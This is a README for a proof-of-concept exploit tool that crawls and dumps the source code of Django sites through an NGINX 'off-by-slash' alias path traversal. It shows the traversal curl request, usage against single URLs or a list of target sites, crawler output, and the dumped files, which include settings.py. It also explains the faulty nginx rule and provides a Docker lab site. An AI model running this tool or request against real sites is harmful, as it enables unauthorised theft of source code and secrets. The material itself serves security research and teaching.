# PoC: Off-by-slash Django Site Dumper

> A proof of concept to dump Django website's source code affected by NGINX's off-by-slash misconfiguration.

![](demo.gif)


## Installation

```bash
$ git clone https://github.com/adamyordan/offbyslash-django-dumper

$ cd offbyslash-django-dumper

$ pip install -r requirements.txt
```


## Usage
Pass target url as argument
```bash
$ python exploit.py --url http://django-site.com/
```

Or using files containing multiple target urls
```bash
$ cat targets.txt
http://django-site.com/
https://other-affected-site.org/
http://cool-website.me/

$ python exploit.py --file targets.txt
```

The result is available at `dump` directory
```
$ tree dump

dump/
└── http-django-site.com-
    ├── api
    │   ├── urls.py
    │   ├── users.py
    │   └── views.py
    ├── common
    │   └── logger.py
    ├── manage.py
    └── app
        ├── __init__.py
        ├── settings.py
        ├── urls.py
        ├── validate.py
        └── wsgi.py
```

## Explanation

This dumper works by using a local file inclusion vulnerability caused by a misconfiguration when using NGINX to serve 
static files. Equivalent curl command used by this dumper to dump local files is:
```bash
$ curl http://django-site.com/static../manage.py
```

Affected sites will return a response with status `200 OK` and body containing the source code of `manage.py` file.


This local file inclusion is caused by a slight but fatal mistake in Nginx's configuration (_Nginx off-by-slash fail_).
For example, here is a snippet of affected nginx rule:
```
location /static {
    alias /home/app/static/;
}
```

By sending a request to `http://django-site.com/static../manage.py`, Nginx matches the rule and appends the remainder 
to destination `/home/app/static/../manage.py`. Therefore serving the `manage.py` as static file.


This dumper utilize this vulnerability to automatically crawl the source code of Django sites, inferring available
source code files by using static analysis (read: pattern matching!), and (recursively?) expand source codes.


## Example Vulnerable Site

An example website is provided in this repository at directory `vulnerable-site` in Dockerfile format.

```bash
$ cd vulnerable-site
$ docker build -t tmp/vulnsite . && docker run --rm -it -p 8000:80 -d tmp/vulnsite


$ cd ..
$ python exploit.py --url http://localhost:8000/

[+] START CRAWLING: http://localhost:8000/
[+] downloading: dump/http-localhost-8000-/manage.py
[+] downloading: dump/http-localhost-8000-/app/settings.py
[+] downloading: dump/http-localhost-8000-/app/wsgi.py
[+] downloading: dump/http-localhost-8000-/app/urls.py
[+] FINISHED: http://localhost:8000/


$ tree dump/
dump/
└── http-localhost-8000-
    ├── app
    │   ├── settings.py
    │   ├── urls.py
    │   └── wsgi.py
    └── manage.py
```


## Reference
- [Blackhat USA 2018 presentation slide - by Orange Tsai](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
- [Nginx alias documentation](http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)